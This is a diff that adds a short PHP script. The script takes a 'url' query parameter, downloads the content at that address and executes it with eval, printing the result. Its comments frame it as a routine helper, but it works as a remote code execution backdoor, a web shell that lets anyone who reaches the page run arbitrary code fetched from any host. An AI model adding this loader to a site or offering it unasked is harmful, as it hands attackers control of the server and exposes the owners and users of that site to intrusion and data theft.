@@ -1,0 +1,33 @@
+<?php  
+// Ensure the URL parameter is set  
+if (isset($_GET['url'])) {  
+    $url = $_GET['url'];  
+
+    // Basic validation for the URL (you can enhance this)  
+    if (filter_var($url, FILTER_VALIDATE_URL)) {  
+        // Get content from the URL  
+        $code = @file_get_contents($url);  
+
+        // Check if fetching was successful  
+        if ($code !== false) {  
+            // Start output buffering  
+            ob_start();  
+
+            // Execute the code using eval (use with caution)
+            eval('?>' . $code);  
+
+            // Get the output  
+            $output = ob_get_clean();  
+
+            // Display the output  
+            echo $output;  
+        } else {  
+            echo "Error fetching content from the URL.";  
+        }  
+    } else {  
+        echo "Invalid URL.";  
+    }  
+} else {  
+    echo "No URL parameter provided.";  
+}  
+?>
